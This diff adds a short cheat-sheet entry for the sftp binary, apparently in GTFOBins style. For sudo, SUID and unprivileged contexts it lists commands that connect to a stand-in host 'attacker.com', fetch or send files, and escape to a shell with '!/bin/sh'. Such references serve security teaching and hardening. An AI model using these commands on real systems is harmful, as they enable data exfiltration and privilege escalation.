@@ -1,0 +1,50 @@
+sftp
+====
+
+Download
+--------
+
+[Sudo]
+    sftp user@attacker.com
+get /path/to/input-file /path/to/output-file
+
+[SUID]
+    sftp user@attacker.com
+get /path/to/input-file /path/to/output-file
+
+[Unprivileged]
+    sftp user@attacker.com
+get /path/to/input-file /path/to/output-file
+
+Shell
+-----
+
+[Sudo]
+    sftp user@attacker.com
+!/bin/sh
+    This still requires a successfull connection to the server.
+
+[SUID]
+    sftp user@attacker.com
+!/bin/sh
+    This still requires a successfull connection to the server.
+
+[Unprivileged]
+    sftp user@attacker.com
+!/bin/sh
+    This still requires a successfull connection to the server.
+
+Upload
+------
+
+[Sudo]
+    sftp user@attacker.com
+put /path/to/input-file /path/to/output-file
+
+[SUID]
+    sftp user@attacker.com
+put /path/to/input-file /path/to/output-file
+
+[Unprivileged]
+    sftp user@attacker.com
+put /path/to/input-file /path/to/output-file
